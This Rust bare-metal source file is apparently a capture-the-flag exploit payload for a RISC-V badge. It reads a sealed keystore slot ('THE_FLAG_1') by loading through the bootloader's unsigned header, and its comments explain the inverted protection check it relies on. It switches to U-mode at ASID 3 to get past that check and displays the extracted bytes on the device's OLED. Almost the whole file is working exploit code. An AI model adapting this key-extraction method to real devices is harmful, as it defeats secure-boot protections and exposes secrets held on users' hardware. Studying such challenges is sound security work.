//! Payload 1: read THE_FLAG_1 from U-mode at ASID 3.
//!
//! Reached by retargeting the loader's UNSIGNED header, which boot1's own `uf2`
//! command will happily write. See docs/01-flag1.md for the whole story.
//!
//! Pages drawn on the OLED, tag blobs in the top margin:
//!   1  CRC32 of the flag, its first 3 bytes, the fault latch
//!      An all-zero flag CRCs to 190a55ad. If you see that, the read was DENIED.
//!   2  eight bytes of the UUID slot. YOUR liveness control.
//!   3..6  the 32 flag bytes
//!
//! Read only. Nothing is written except by tools/uf2send.py, and that is reverted.

#![no_std]
#![no_main]

extern crate alloc;

use core::panic::PanicInfo;

#[path = "../common.rs"]
mod common;
use common::{crc32, draw_page8, open_oled, spin, Bump};

#[global_allocator]
static ALLOC: Bump = Bump;

#[panic_handler]
fn panic(_i: &PanicInfo) -> ! {
    loop {
        core::hint::spin_loop()
    }
}

const SLOT_BASE: usize = 0x603E_0000; // DATA_SLOT_START
const fn slot(n: usize) -> usize {
    SLOT_BASE + n * 32
}
const FLAG_ADDR: usize = slot(260); // THE_FLAG_1, PartitionAccess::Fw0
const UUID_ADDR: usize = slot(1); // UUID, PartitionAccess::Open. See the warning below.
const PT_ADDR: usize = 0x6100_0000; // page table, 4 KiB aligned
const SATP: u32 = (1 << 31)                    // MODE = Sv32
    | (3 << 22)                                // ASID = 3, where the keystore service runs
    | ((PT_ADDR as u32) >> 12); // PPN

static mut RES_F: [u8; 32] = [0; 32];
static mut RES_U: [u8; 32] = [0; 32];
static mut FAULTED: u32 = 0;

// Nothing else zeroes .bss on this link path: there is no C runtime here, so a
// static Rust believes is zero holds whatever SRAM happened to contain.
core::arch::global_asm!(
    ".section .text.entry, \"ax\"",
    ".global _start",
    "_start:",
    "  la   sp, _stack_top",
    "  la   t0, __sbss",
    "  la   t1, __ebss",
    "1:  bgeu t0, t1, 2f",
    "  sw   zero, 0(t0)",
    "  addi t0, t0, 4",
    "  j    1b",
    "2:  j payload_main",
);

// mcause 8 is an ecall from U-mode: our clean finish. Anything else is a real
// fault, so latch it and still reach the screen. A silent hang tells you nothing,
// and on this badge you pay five minutes of battery-pulling for every one.
core::arch::global_asm!(
    ".section .text, \"ax\"",
    ".align 4",
    ".global trap_entry",
    "trap_entry:",
    "  csrr t2, mcause",
    "  li   t3, 8",
    "  beq  t2, t3, 1f",
    "  li   t3, 9",
    "  beq  t2, t3, 1f",
    "  la   t0, {faulted}",
    "  li   t1, 1",
    "  sw   t1, 0(t0)",
    "1:",
    "  li   t0, 0x1800",
    "  csrs mstatus, t0", // MPP = 11, back to machine mode
    "  la   sp, _stack_top",
    "  la   t0, render",
    "  csrw mepc, t0",
    "  mret",
    faulted = sym FAULTED,
);
unsafe extern "C" {
    fn trap_entry();
}

/// Runs in U-mode with satp.ASID = 3. This is the whole trick.
///
/// boot1/src/secboot.rs:17 says protect() inverts the mm sense, so "you must enter
/// a virtual memory USER state to access sealed keys". In RISC-V, S-mode is
/// SUPERVISOR. S-mode at ASID 3 returns all zeros and does not fault, which looks
/// exactly like a broken toolchain. Only U-mode returns the data.
#[unsafe(no_mangle)]
pub unsafe extern "C" fn u_phase() -> ! {
    unsafe {
        let f = core::ptr::addr_of_mut!(RES_F) as *mut u8;
        let u = core::ptr::addr_of_mut!(RES_U) as *mut u8;
        for i in 0..32 {
            core::ptr::write_volatile(f.add(i), core::ptr::read_volatile((FLAG_ADDR + i) as *const u8));
            core::ptr::write_volatile(u.add(i), core::ptr::read_volatile((UUID_ADDR + i) as *const u8));
        }
        core::arch::asm!("ecall", options(noreturn));
    }
}

#[unsafe(no_mangle)]
pub extern "C" fn payload_main() -> ! {
    unsafe {
        // Sv32 identity map, 4 MiB megapages. 0xDF = D|A|U|X|W|R|V.
        // The U bit is what lets user mode touch these pages at all.
        let pt = PT_ADDR as *mut u32;
        for i in 0..1024usize {
            core::ptr::write_volatile(pt.add(i), ((i as u32) << 20) | 0xDF);
        }
        core::arch::asm!(
            "csrw mtvec, {tv}",
            // boot1 leaves medeleg/mideleg at 0xFFFFFFFF (irq.rs:50-51) and never
            // restores them. Skip these two lines and your own ecall is delivered
            // to an uninitialised stvec: blank screen, no clue why.
            "csrw medeleg, zero",
            "csrw mideleg, zero",
            "csrw stvec, {tv}",
            "sfence.vma",
            "csrw satp, {satp}",
            "sfence.vma",
            "li   t0, 0x1800",
            "csrc mstatus, t0", // MPP = 00 -> U-mode. 01 would be S-mode: reads zeros.
            "csrw mepc, {e}",
            "mret",
            tv   = in(reg) trap_entry as usize,
            satp = in(reg) SATP,
            e    = in(reg) u_phase as usize,
            out("t0") _,
        );
    }
    loop {
        core::hint::spin_loop()
    }
}

#[unsafe(no_mangle)]
pub extern "C" fn render() -> ! {
    unsafe {
        core::arch::asm!("csrw satp, zero", "sfence.vma");
    }
    let iox = bao1x_hal::iox::Iox::new(utralib::utra::iox::HW_IOX_BASE as *mut u32);
    let udma = bao1x_hal::udma::GlobalConfig::new();
    let mut oled = open_oled(&iox, &udma);

    let (f, u, fault) = unsafe {
        (
            *core::ptr::addr_of!(RES_F),
            *core::ptr::addr_of!(RES_U),
            core::ptr::read_volatile(core::ptr::addr_of!(FAULTED)),
        )
    };
    let c = crc32(&f);
    let p1 = [
        (c >> 24) as u8, (c >> 16) as u8, (c >> 8) as u8, c as u8,
        f[0], f[1], f[2], fault as u8,
    ];
    loop {
        draw_page8(oled.buffer_mut(), &p1, 1);
        oled.redraw().ok();
        spin(400_000_000);
        draw_page8(oled.buffer_mut(), &u[0..8], 2);
        oled.redraw().ok();
        spin(400_000_000);
        for p in 0..4usize {
            draw_page8(oled.buffer_mut(), &f[p * 8..p * 8 + 8], p + 3);
            oled.redraw().ok();
            spin(400_000_000);
        }
    }
}
